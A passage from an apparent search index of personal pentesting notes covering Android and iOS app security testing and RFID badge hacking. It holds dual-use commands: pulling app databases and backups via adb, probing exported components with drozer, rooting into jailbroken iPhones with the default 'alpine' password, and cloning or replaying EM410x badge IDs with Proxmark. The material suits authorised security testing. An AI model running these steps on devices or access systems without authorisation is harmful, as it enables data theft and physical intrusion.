17).\" Check for unencrypted sensitive files in SQL database # Databases are stored in /data/data/[packeage name]/databases/ . You can usually not pull them down using adb directory with pull because you need to be root. So instead you can move the data to sdcard. adb shell mkdir /sdcard/exfil cp /data/data/[packeage name]/databases/* /sdcard/exfil adb pull /sdcard/exfil sudo aptitude install sqlite sqlite3 database.db .dump Check for sensitive information in external storage # External storage are storage that may be removable, such as an sdcard, or built in. These storages are world reaible. So if the application stores data here any other application can read that data. Also, files stored outside of the /data/data/[package name]/ are not removed if the application is uninstalled. # How are creds stored? Connect your device to to your pentest-vm. Install ADB. Run adb shell To become root: su Now you can go to /data/data/com.yourappliucation.test Check Misc # Check for hardcoded credentials # Check for strings. MobSF lists all strings. Unintended data leaks # Check that sensitive data is not logged # Use adb and get a shell. Run logcat as root. And then use the applicaiton, do you see passwords, tokens, or other sensitive data? You can also check the source code for logs. Disallow copy-paste for sensitive data # The clipboard can be accessed by all applications on the phone. It should not be possible to copy data that is considered sensitive, as that might leak to other applications. Analytics sent to third party # Check that sensitive data is not leaked to third parties Check for Firebase access control # Look for a string looking like this somethingsomething.firebaseio.com . Check if you can access sensitive data in: somethingsomething.firebaseio.com/.json Webview attacks # Check that javascript is disabled # Javascript is disabled by default. But can be enabled with: setJavaScriptEnabled() Network security # Check for non-http traffic # When the device is on your access-point, run wireshark and dump its traffic. Do you see anything unusual that might indicate that the application is communicating over non-http? Check for unencrypted http traffic # Use the application. Check in burk or wireshark that no non-tls-traffic is sent. Check if application verifies server certificate # Two key issues need to be verified. - That the application verifies that the server certificate comes from a trusted CA - Determine weather the endpoint server presents a the right certificate openssl s_client -proxy localhost:8080 -connect google.com:443 -showcerts Verify that self-signed certificates are not accepted # In burp go to Proxy / Options / Proxy Listener / Edit / Certificate / Use Self signed certificate Then try to use the application, if the application is still working and you see requests going through then the application is not checking the servers certificate. Verify that correct hostname certificates are not accepted # It might be that the developers made the application check for a specific hostname in the CN-field in the server certificate, but nothing else This can be done automatically using burp if you go to Proxy / Options / Proxy Listener / Edit / Certificate / Generate CA Signed certificate with specific hostname HOWEVER, this will make burp generate a certificate from the CA portswigger, so if you have already installed your portswigger root certificate in your mobile phone the phone will trust your certificate. Which of course is by design and not an issue. So only use the burp method if you have removed the burp CA in your phone. Otherwise you can just generate your own certificate, with this oneline. Remember to put in the correct CN (Common name), it should be the common-name that is the same as the one that the legitimate server presents. openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem Check how your certificate came out with this command: openssl x509 -text -noout -in certificate.pem Now you have to combine your private key with your public certificate. The archive/format for this is pkcs12. And the combined archive can be create using the following command: openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12 Set a password Now go to Burp Proxy / Options / Proxy Listener / Edit / Certificate / Use a Custom Certificate Add your pkcs12 formatted certificate and key, insert the password. Rememer, the private key is used to decrypt the traffic. Without Check that you have actaully done everything right and download the certificate openssl s_client -proxy localhost:8080 -connect PAGEYOURARETESTING.com:443 -showcerts Now use the application and see if it works. If you can see the traffic it means the mobile application accepts your crappy self-generated certificate, and ca therefore be performed by an attacker. If the application does not work, it does not send any requests through burp, everything is working as it should. References # https://labs.f-secure.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf","title":"Vulnerabilities"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-manifest-misconfigurations","text":"To read the manifest file and other files and assets you can use: sudo aptitude install apktool apktool d blabla.apk cd res/xml","title":"Check for manifest misconfigurations"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#allow-backup-set-to-true","text":"In the manifest file it is possible to specify if it should be possible to backup the application data, if the user has usb debugging enabled. Applications that store sensitive data on disk should have this set to false: Check for the following in the manifest file: android:allowBackup=\"false\" If backup is allowed you can backup the data like this: adb backup -apk com.theapp.blabla sudo aptitude install qpdf #this is where zlib-flate is found dd if=backup.ab bs=24 skip=1 | zlib-flate -uncompress > res.tar tar xvf res.tar","title":"Allow backup set to true"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-if-application-is-run-in-debuggable-mode","text":"If the application is configured to run in debuggable mode the following will be set in the manifest file. <application debuggable=\"true\" It can also be checked with drozer with: run app.package.debuggable","title":"Check if application is run in debuggable mode"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-network-security-configurations","text":"Cleartexttraffic is set to false by default in android 9. Network traffic configuration is set in the manifest-file. If you see this in the manifest-file it means that the configurations are made in the network-security file. android:networkSecurityConfig=\"@xml/network_security_config\" The network-security file is found in res/xml/network_security_config.xml . Check if domain-config cleartextTrafficPermitted=\"true\" is set to true, and to what domain it is allowed.","title":"Check network security configurations"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-permissions","text":"If the application has to wide permissions it might be a concern for privacy, but usually not a vulnerability or risk to the application itself. Check permissions i the manifest file or with Drozer. Drozer command: run app.package.info -a com.yourapp.blabla There is no general right or wrong. Are the permissions correct in relation to what the application is doing? Some a universally dangerous permissions, like the following. There is not many legitimate reasons to allow an app to install other packages. android.permissions.INSTALL_PACKAGES Each permission has a android-defined permissions level: normal , dangerous and signature . https://developer.android.com/guide/topics/permissions/overview#normal-dangerous If a permission is defined as \"dangerous\", such as reading contacts. The user must explicitly agree to the permission for it to be active.","title":"Check permissions"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#exploiting-application-components","text":"There are four types of \"components\" in an android applications: - Activity - screens/views - Content provider - database objects - Services - background workers - Broadcast receiver Three of these four components are activated using asynchronous messages called \"intents\". The components that are activated using intents are activity , services , and broadcast receivers If a component is exported or not is defined in the manifest.xml file. You can map the attacksurface of the components using these drozer commands run app.package.list run app.package.attacksurface app.theapp","title":"Exploiting application components"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#exploiting-exported-activities","text":"What is an intent? \"An Intent provides a facility for performing late runtime binding between the code in different applications. Its most significant use is in the launching of activities, where it can be thought of as the glue between activities. It is basically a passive data structure holding an abstract description of an action to be performed.\" A good explanation of how this attack works is here: https://appsec-labs.com/portal/hacking-android-apps-through-exposed-components/ Activities that are specified as \"exported\" in the manifest file can be run by other applications on the phone. In a sense, the other application is just running a function on the victim-application. What that function does depends on the application. The Activities might just start a new view. But they may also include arguments. Look for activities that are exported and allows arguments. .getExtras To check which activitites are exported run: run app.package.list run app.package.attacksurface com.appen.blabla Attack Surface: 2 activities exported 2 broadcast receivers exported 0 content providers exported 2 services exported Now you want to check which activities those are: run app.activity.info -a com.appen.blabla run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList","title":"Exploiting exported activities"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#hidden-view","text":"There might be hidden functionality in the application, than can be accessed by a user, using adb or drozer. It might be the case that only premium users should be able to access certain functionality. ANd that functionality is accessible in the application, but there is no backend checks. So a user would be able to use the free version, but access functionality that should only be accessible to premium users. Check for: List the activities, and test them. Do they expose functionality that should not be accessible to the user. run app.activity.info -a com.theapp.blabla","title":"Hidden view"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#phishing","text":"Check if an activity that is exported, and therefore can be started by other applications, can be used in some kind of phishing-attack. The idea would be to create a fake application, that does something, and then open up the activity of the victim-application, thereby tricking the victim into inserting data into that view. Check for by starting the different views and see if any can be used in phishing attacks. run app.activity.info -a com.theapp.blabla","title":"Phishing"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#injections","text":"Activities can be configured to accept arguments. This means that a malicious application could start the activity and also insert arguments that might be processed in some way. An activity is just an event, and can be programmed to do whatever, so you will need to review the source-code of the activity in order to see if it takes arguments, and in that case see how the argument is processed. Maybe the argument is used to access an sql-database on the phone, or something else like that. Activities that have arguments use the getExtras() function. So search the source-code for getExtras , and see if it is used with any of the exported activities. You can also look for getStringExtra() . If you find one you can use it like this: dz> run app.activity.start --component app.theapp.dev app.theapp.core.main.theactivity --extra string aaaaa bbb","title":"Injections"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#exploiting-insecure-content-providers","text":"Content providers are interfaces for sharing data between applications. Each content provider has en url that looks something like this content:// . Other applications can use the content provider to query information. They can use functions like insert() , query() , and update() to access data in another application. If this is configured incorrectly another application could possibly access sensitive data from the application. The data might be a file written to the disk, or it might be written to a database, or some other persistent storage.","title":"Exploiting insecure Content Providers"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#if-content-providers-are-exported","text":"Again content providers that are exported means that they are exposed to other applications. So, in order to map the exported content providers you can look in the manifest file or check it using drozer. With drozer it looks like this: run app.package.attacksurface app.theapp If you find that there are some content providers that are exported you can get more info on them with this command: run app.provider.info -a app.theapp To list all providers, even the content providers that other application can't access you add the -u flag. run app.provider.info -a app.theapp -u","title":"If content providers are exported"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-if-sensitive-information-can-be-accessed","text":"Check for uri paths: run app.provider.finduri com.appen.blabla If you find some content providers that are exported you can query those and see if you can access some sensitive information. This can be done like this: run app.provider.query content://com.theapp.uripath/","title":"Check if sensitive information can be accessed"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-sql-injections","text":"Content providers are sometimes connected to a SQLite database. Check out https://solidgeargroup.com/en/sql-injection-in-content-providers-of-android-and-how-to-be-protected/ resources how to check for this and exploit.","title":"Check for SQL injections"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#attacking-insecure-services","text":"A services is a component that is running in the background to perform long-running operations or to perform work for remote processes. A service might play music in the background while the user is in a different application. Or it might access data over the network while the user is doing something else. There are three different types of services scheduled , started , and bound . The services are listed in the manifest file, it looks something like this in the manifest: <service android: name=\u201d.Example Service\u201d /> run app.service.info -a com.theapp.blabla You can run a service like this: run app.service.start --action com.theapp.blabla.somService --component com.theapp.blabla com.theapp.blabla.somService https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/drozer-tutorial","title":"Attacking Insecure Services"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#attacking-broadcast-receivers","text":"Applications can register broadcast receivers, this will allow them to be able to receive broadcast from the OS or from other applications. It is like a publish-subscribe pattern. If an application registers to receive a specific broadcast the system till route traffic to that application when such a broadcast is published.","title":"Attacking broadcast receivers"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#storage","text":"Data can be stored in multiple ways in an android device. For example: Shared Preferences SQLite Databases Realm Databases Internal Storage External Storage","title":"Storage"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-sensitive-information-in-shared_prefs","text":"The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world-readable (accessible to all apps) or private. Misuse of the SharedPreferences API can often lead to exposure of sensitive data. Check the following file to see if sensitive data (like passwords or tokens) are stored in it. /data/data/<package-name>/shared_prefs/key.xml","title":"Check for sensitive information in shared_prefs"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-world-readable-files-in-the-app","text":"Maybe som files on the application for some reason has received incorrect filepermissions, drozer can find those: run scanner.misc.readablefiles /data/data/com.theapp.blabla Or you can go to the app: ls -la /data/data/app.theapp.blabla/shared_prefs And look for -rw-rw-r-- From the owasp guide: \"Please note that MODE_WORLD_READABLE and MODE_WORLD_WRITEABLE were deprecated starting on API level 17. Although newer devices may not be affected by this, applications compiled with an android:targetSdkVersion value less than 17 may be affected if they run on an OS version that was released before Android 4.2 (API level 17).\"","title":"Check for world readable files in the app"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-unencrypted-sensitive-files-in-sql-database","text":"Databases are stored in /data/data/[packeage name]/databases/ . You can usually not pull them down using adb directory with pull because you need to be root. So instead you can move the data to sdcard. adb shell mkdir /sdcard/exfil cp /data/data/[packeage name]/databases/* /sdcard/exfil adb pull /sdcard/exfil sudo aptitude install sqlite sqlite3 database.db .dump","title":"Check for unencrypted sensitive files in SQL database"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-sensitive-information-in-external-storage","text":"External storage are storage that may be removable, such as an sdcard, or built in. These storages are world reaible. So if the application stores data here any other application can read that data. Also, files stored outside of the /data/data/[package name]/ are not removed if the application is uninstalled.","title":"Check for sensitive information in external storage"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#misc","text":"","title":"Misc"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-hardcoded-credentials","text":"Check for strings. MobSF lists all strings.","title":"Check for hardcoded credentials"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#unintended-data-leaks","text":"","title":"Unintended data leaks"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-that-sensitive-data-is-not-logged","text":"Use adb and get a shell. Run logcat as root. And then use the applicaiton, do you see passwords, tokens, or other sensitive data? You can also check the source code for logs.","title":"Check that sensitive data is not logged"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#disallow-copy-paste-for-sensitive-data","text":"The clipboard can be accessed by all applications on the phone. It should not be possible to copy data that is considered sensitive, as that might leak to other applications.","title":"Disallow copy-paste for sensitive data"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#analytics-sent-to-third-party","text":"Check that sensitive data is not leaked to third parties","title":"Analytics sent to third party"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-firebase-access-control","text":"Look for a string looking like this somethingsomething.firebaseio.com . Check if you can access sensitive data in: somethingsomething.firebaseio.com/.json","title":"Check for Firebase access control"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#webview-attacks","text":"","title":"Webview attacks"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-that-javascript-is-disabled","text":"Javascript is disabled by default. But can be enabled with: setJavaScriptEnabled()","title":"Check that javascript is disabled"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#network-security","text":"","title":"Network security"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-non-http-traffic","text":"When the device is on your access-point, run wireshark and dump its traffic. Do you see anything unusual that might indicate that the application is communicating over non-http?","title":"Check for non-http traffic"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-for-unencrypted-http-traffic","text":"Use the application. Check in burk or wireshark that no non-tls-traffic is sent.","title":"Check for unencrypted http traffic"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#check-if-application-verifies-server-certificate","text":"Two key issues need to be verified. - That the application verifies that the server certificate comes from a trusted CA - Determine weather the endpoint server presents a the right certificate openssl s_client -proxy localhost:8080 -connect google.com:443 -showcerts","title":"Check if application verifies server certificate"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#verify-that-self-signed-certificates-are-not-accepted","text":"In burp go to Proxy / Options / Proxy Listener / Edit / Certificate / Use Self signed certificate Then try to use the application, if the application is still working and you see requests going through then the application is not checking the servers certificate.","title":"Verify that self-signed certificates are not accepted"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#verify-that-correct-hostname-certificates-are-not-accepted","text":"It might be that the developers made the application check for a specific hostname in the CN-field in the server certificate, but nothing else This can be done automatically using burp if you go to Proxy / Options / Proxy Listener / Edit / Certificate / Generate CA Signed certificate with specific hostname HOWEVER, this will make burp generate a certificate from the CA portswigger, so if you have already installed your portswigger root certificate in your mobile phone the phone will trust your certificate. Which of course is by design and not an issue. So only use the burp method if you have removed the burp CA in your phone. Otherwise you can just generate your own certificate, with this oneline. Remember to put in the correct CN (Common name), it should be the common-name that is the same as the one that the legitimate server presents. openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem Check how your certificate came out with this command: openssl x509 -text -noout -in certificate.pem Now you have to combine your private key with your public certificate. The archive/format for this is pkcs12. And the combined archive can be create using the following command: openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12 Set a password Now go to Burp Proxy / Options / Proxy Listener / Edit / Certificate / Use a Custom Certificate Add your pkcs12 formatted certificate and key, insert the password. Rememer, the private key is used to decrypt the traffic. Without Check that you have actaully done everything right and download the certificate openssl s_client -proxy localhost:8080 -connect PAGEYOURARETESTING.com:443 -showcerts Now use the application and see if it works. If you can see the traffic it means the mobile application accepts your crappy self-generated certificate, and ca therefore be performed by an attacker. If the application does not work, it does not send any requests through burp, everything is working as it should.","title":"Verify that correct hostname certificates are not accepted"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/#references","text":"https://labs.f-secure.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf","title":"References"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/","text":"Data storage # Data is stored in the application directory. Which is found like this: /var/mobile/Containers/Data/Application/$APP_ID/ In order to find the APP_ID you can do the following: First you list all applications, and identify your application: ipainstaller -l Then search all directories for that name find ./ -iname PACKAGE-Name References: http://www.securitylearn.net/2013/04/15/penetration-testing-of-iphone-applications-part-4/ Check that snapshots of sensitive data is not stored # Whenever a user backgrounds an application a snaopshot i taken. You can find them here: /private/var/mobile/Containers/Data/Application/<GUID>/Library/Caches/Snapshots In order to view the file you can use this script to convert it to PNG: https://github.com/ydkhatri/MacForensics/blob/master/IOS_KTX_TO_PNG/ios_ktx2png.py Check for secrets or sensitive information in plist files # plist is a structured binary formatted file. It can contain interesting data. You can't read plist files with cat, put you can read them with plistutils sudo aptitude install libplist-utils plistutil -i file.plist The files are usually stored in [Application\u2019s Home Directory]/documents/preferences . The files are usually used to store applications and configurations. But they can be used to store session information, passwords or whatever. Authorisation and authention can be decided based on entries in a plist. Find plist the following way: find ./ -iname *plist However, note that the file might not end with the plist fileending. Check for other sensitive data in documents # Browse around and see if they are storing sensitive stuff here. Check for sensitive data in sqlite databases # find ./ -iname *sqlite -o -iname *db -o -iname *sqlitedb Check for sensitive data in keyboard cache # Check that sensitive data is not persistent in keychain # Unintended data leaks # Check for Firebase access control # Look for a string looking like this somethingsomething.firebaseio.com . Check if you can access sensitive data in: somethingsomething.firebaseio.com/.json","title":"Vulnerabilities"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#data-storage","text":"Data is stored in the application directory. Which is found like this: /var/mobile/Containers/Data/Application/$APP_ID/ In order to find the APP_ID you can do the following: First you list all applications, and identify your application: ipainstaller -l Then search all directories for that name find ./ -iname PACKAGE-Name References: http://www.securitylearn.net/2013/04/15/penetration-testing-of-iphone-applications-part-4/","title":"Data storage"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#check-that-snapshots-of-sensitive-data-is-not-stored","text":"Whenever a user backgrounds an application a snaopshot i taken. You can find them here: /private/var/mobile/Containers/Data/Application/<GUID>/Library/Caches/Snapshots In order to view the file you can use this script to convert it to PNG: https://github.com/ydkhatri/MacForensics/blob/master/IOS_KTX_TO_PNG/ios_ktx2png.py","title":"Check that snapshots of sensitive data is not stored"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#check-for-secrets-or-sensitive-information-in-plist-files","text":"plist is a structured binary formatted file. It can contain interesting data. You can't read plist files with cat, put you can read them with plistutils sudo aptitude install libplist-utils plistutil -i file.plist The files are usually stored in [Application\u2019s Home Directory]/documents/preferences . The files are usually used to store applications and configurations. But they can be used to store session information, passwords or whatever. Authorisation and authention can be decided based on entries in a plist. Find plist the following way: find ./ -iname *plist However, note that the file might not end with the plist fileending.","title":"Check for secrets or sensitive information in plist files"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#check-for-other-sensitive-data-in-documents","text":"Browse around and see if they are storing sensitive stuff here.","title":"Check for other sensitive data in documents"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#check-for-sensitive-data-in-sqlite-databases","text":"find ./ -iname *sqlite -o -iname *db -o -iname *sqlitedb","title":"Check for sensitive data in sqlite databases"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#check-for-sensitive-data-in-keyboard-cache","text":"","title":"Check for sensitive data in keyboard cache"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#check-that-sensitive-data-is-not-persistent-in-keychain","text":"","title":"Check that sensitive data is not persistent in keychain"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#unintended-data-leaks","text":"","title":"Unintended data leaks"},{"location":"attacking_mobile_applications/ios/ios_application_vulnerabilities/#check-for-firebase-access-control","text":"Look for a string looking like this somethingsomething.firebaseio.com . Check if you can access sensitive data in: somethingsomething.firebaseio.com/.json","title":"Check for Firebase access control"},{"location":"attacking_mobile_applications/ios/ios_setup/","text":"Pentesting application on iPhone # With jailbreak # It is possible to get a application working without rooting it. BUUUT you need a developer certificate. You can get a temprorary though, for just a few days. SO you can certify the application, then send it to the phone. With Checkra # After rooting the device, open up the Checkra icon. And install Cydia. Openssh # Open Cydia and search for OpenSSH. Install it. It is a console app so there is no icon for it. Once it is installed you can access it over SSH. So just run root@iphone-ip-address. The default password is alpine . Ipainstaller # With cydia you can install ipainstaller . Extracting ipa files # With ipainstaller you can extract it like this: First list all packages: ipainstaller -l . Then identify the package, and do ipainstaller -b the.app.com . Then use scp to transfer it to your machine. scp root@10.0.0.1:/private/var/mobile/Documents/package.ipa ./ Without jailbreak # Getting the application onto the phone # If the device is rooted you can simply go to Re-activate JB. Click \"GO\", and then follow the instructions. Once that is done you want to enable ssh, in order to install the ipa. So you go to \"Toggle SSH\" and enable ssh deamon. Now you can log in to the mobile over ssh with the root-account, and the password that is on the backside of the phone. To install an ipa you can use the command \"ipainstaller\". It can be downloaded thgouh cydia. Trust the developer AFter the application has finished installing it should pop up among your applications on the phone. When you try to open it it might be denied because Apple does not trust the developer of the application. To solve that problem you go to Settings/General/Profiles and Device Management/ and then click on the developer of the application. ANd then add \"Trust\". BankdID If you proxy all traffic through burp, burp will intercept traffic to the bankid servers. Since the bankid application has certificate pinning, you cannot intercept that traffic. Instead the traffic won't be sent at all. So in order to fix that if your application requrires BankID you can add SSL Passthrough in burp. So that Burp won't intercept traffic to specific host. You do that by going to Proxy/Options/SSL Passthrough Then add: .*bankid.com.*$","title":"IOS Testing Environment Setup"},{"location":"attacking_mobile_applications/ios/ios_setup/#pentesting-application-on-iphone","text":"","title":"Pentesting application on iPhone"},{"location":"attacking_mobile_applications/ios/ios_setup/#with-jailbreak","text":"It is possible to get a application working without rooting it. BUUUT you need a developer certificate. You can get a temprorary though, for just a few days. SO you can certify the application, then send it to the phone.","title":"With jailbreak"},{"location":"attacking_mobile_applications/ios/ios_setup/#with-checkra","text":"After rooting the device, open up the Checkra icon. And install Cydia.","title":"With Checkra"},{"location":"attacking_mobile_applications/ios/ios_setup/#openssh","text":"Open Cydia and search for OpenSSH. Install it. It is a console app so there is no icon for it. Once it is installed you can access it over SSH. So just run root@iphone-ip-address. The default password is alpine .","title":"Openssh"},{"location":"attacking_mobile_applications/ios/ios_setup/#ipainstaller","text":"With cydia you can install ipainstaller .","title":"Ipainstaller"},{"location":"attacking_mobile_applications/ios/ios_setup/#extracting-ipa-files","text":"With ipainstaller you can extract it like this: First list all packages: ipainstaller -l . Then identify the package, and do ipainstaller -b the.app.com . Then use scp to transfer it to your machine. scp root@10.0.0.1:/private/var/mobile/Documents/package.ipa ./","title":"Extracting ipa files"},{"location":"attacking_mobile_applications/ios/ios_setup/#without-jailbreak","text":"","title":"Without jailbreak"},{"location":"attacking_mobile_applications/ios/ios_setup/#getting-the-application-onto-the-phone","text":"If the device is rooted you can simply go to Re-activate JB. Click \"GO\", and then follow the instructions. Once that is done you want to enable ssh, in order to install the ipa. So you go to \"Toggle SSH\" and enable ssh deamon. Now you can log in to the mobile over ssh with the root-account, and the password that is on the backside of the phone. To install an ipa you can use the command \"ipainstaller\". It can be downloaded thgouh cydia. Trust the developer AFter the application has finished installing it should pop up among your applications on the phone. When you try to open it it might be denied because Apple does not trust the developer of the application. To solve that problem you go to Settings/General/Profiles and Device Management/ and then click on the developer of the application. ANd then add \"Trust\". BankdID If you proxy all traffic through burp, burp will intercept traffic to the bankid servers. Since the bankid application has certificate pinning, you cannot intercept that traffic. Instead the traffic won't be sent at all. So in order to fix that if your application requrires BankID you can add SSL Passthrough in burp. So that Burp won't intercept traffic to specific host. You do that by going to Proxy/Options/SSL Passthrough Then add: .*bankid.com.*$","title":"Getting the application onto the phone"},{"location":"attacking_mobile_applications/ios/ios_vuln_checklist/","text":"Data storage # [ ] Check that sensitive data is not persistent in keychain [ ] Check that snapshots are blurred [ ] Check for secrets or sensitive information in plist files [ ] Check for other sensitive data in documents [ ] Check for sensitive cookie in Binary.Cookies [ ] Check for sensitive data in sqlite databases Unintended data leaks # [ ] Check for Firebase access control Network security # [ ] Check that certificate is verified [ ] Check that not special network security bypasses it set","title":"Vulnerabilities Checklist"},{"location":"attacking_mobile_applications/ios/ios_vuln_checklist/#data-storage","text":"[ ] Check that sensitive data is not persistent in keychain [ ] Check that snapshots are blurred [ ] Check for secrets or sensitive information in plist files [ ] Check for other sensitive data in documents [ ] Check for sensitive cookie in Binary.Cookies [ ] Check for sensitive data in sqlite databases","title":"Data storage"},{"location":"attacking_mobile_applications/ios/ios_vuln_checklist/#unintended-data-leaks","text":"[ ] Check for Firebase access control","title":"Unintended data leaks"},{"location":"attacking_mobile_applications/ios/ios_vuln_checklist/#network-security","text":"[ ] Check that certificate is verified [ ] Check that not special network security bypasses it set","title":"Network security"},{"location":"attacking_rfid_cards/basics_of_rfid_hacking/","text":"RFID # A Radio Frequency Identifiers (RFID) card transmits bits over radio. It uses electromagentic field to communicate. Some tags are passive, which means that they are activated by the reader. Some tags are active and does therefore require a local powersource (like a battery). The higher the frequency the more bits can be sent per second. RFID always implied the following: - a tag - a reader - an antenna NFC # NFC - Near Field Communication is a set of protocols. These protocols allows to devices to exchange information within 4 centimeters. They operate on the same range as RFID. The main purpose of NFC was to allow both the tag and the reader to send and recieve information. With RFID a tag can only send information, but not receive it. Trademarks # There are many known trademarks. Producers of chips that use RFID technology. Some common ones are EM, HID and MIFARE MIFARE # MIFARE is a trademark for a series of chips. MIFARE is owned by NXP semiconductors which was previously Philips Electronics. So it is just a chip, which uses RFID technology. MIFARE is split into four main groups. MIFARE Classic 1k/4k. It can store 1025 bytes or 4096 bytes. The memory/disk is divided into different sectors and blocks. It is used for access badges. MIFARE ultralight - A 64 byte version fo MIFARE Classic. Is cheap to make. So it is used for disposable ticketsfor events and transportation. MIFARE Plus - The replacement for Classic. With 128-bit AES encryption. MIFARE DESFire - Comes with the OS DESFire, which contains a filestructure and files. The best in terms of security. Identify your card # You place the card on the reader and run lf search . If it responds like this: EM410x pattern found: You have found a tag with EM410x. It runs on 125 kHz. It is a low frequency chip. You will probably see something like this: EM410x pattern found: EM TAG ID : 00002A3B26 If you have gotten the TAG ID, you can choose to either Emulate it, which tells Proxmark to act like that tag. It will then send out the same pattern as the card itself, and you can get into the door. Or you can simply clone it. With this knowledge you can now use more specific EM410 commands. lf help [...] em { EM4X CHIPs & RFIDs... } [...] proxmark3> lf em help This help 410xread [findone] -- Extract ID from EM410x tag (option 0 for continuous loop, 1 for only 1 tag) 410xdemod [clock] [invert<0|1>] [maxErr] -- Demodulate an EM410x tag from GraphBuffer (args optional) 410xsim <UID> [clock rate] -- Simulate EM410x tag 410xbrute ids.txt [d (delay in ms)] [c (clock rate)] -- Reader bruteforce attack by simulating EM410x tags 410xwatch ['h'] -- Watches for EM410x 125/134 kHz tags (option 'h' for 134) 410xspoof ['h'] --- Watches for EM410x 125/134 kHz tags, and replays them. (option 'h' for 134) 410xwrite <UID> <'0' T5555> <'1' T55x7> [clock rate] -- Write EM410x UID to T5555(Q5) or T55x7 tag, optionally setting clock rate Clone the EM410 # You need to first read the data of the tag, and then write it somewhere. You can use a T55x7 tag to write it to. I got a T5577 with my proxmark. So just put your T5577 tag on your proxmark, and then run the following command: You take the TAG ID, that was previously identified and you run it like this: proxmark3> lf em4x em410xwrite 00002A3B26 1 Now it should have been written to your tag, and it should work.","title":"Basics of RFID Hacking"},{"location":"attacking_rfid_cards/basics_of_rfid_hacking/#rfid","text":"A Radio Frequency Identifiers (RFID) card transmits bits over radio. It uses electromagentic field to communicate. Some tags are passive, which means that they are activated by the reader. Some tags are active and does therefore require a local powersource (like a battery). The higher the frequency the more bits can be sent per second. RFID always implied the following: - a tag - a reader - an antenna","title":"RFID"},{"location":"attacking_rfid_cards/basics_of_rfid_hacking/#nfc","text":"NFC - Near Field Communication is a set of protocols. These protocols allows to devices to exchange information within 4 centimeters. They operate on the same range as RFID. The main purpose of NFC was to allow both the tag and the reader to send and recieve information. With RFID a tag can only send information, but not receive it.","title":"NFC"},{"location":"attacking_rfid_cards/basics_of_rfid_hacking/#trademarks","text":"There are many known trademarks. Producers of chips that use RFID technology. Some common ones are EM, HID and MIFARE","title":"Trademarks"},{"location":"attacking_rfid_cards/basics_of_rfid_hacking/#mifare","text":"MIFARE is a trademark for a series of chips. MIFARE is owned by NXP semiconductors which was previously Philips Electronics. So it is just a chip, which uses RFID technology. MIFARE is split into four main groups. MIFARE Classic 1k/4k. It can store 1025 bytes or 4096 bytes. The memory/disk is divided into different sectors and blocks. It is used for access badges. MIFARE ultralight - A 64 byte version fo MIFARE Classic. Is cheap to make. So it is used for disposable ticketsfor events and transportation. MIFARE Plus - The replacement for Classic. With 128-bit AES encryption. MIFARE DESFire - Comes with the OS DESFire, which contains a filestructure and files. The best in terms of security.","title":"MIFARE"},{"location":"attacking_rfid_cards/basics_of_rfid_hacking/#identify-your-card","text":"You place the card on the reader and run lf search . If it responds like this: EM410x pattern found: You have found a tag with EM410x. It runs on 125 kHz. It is a low 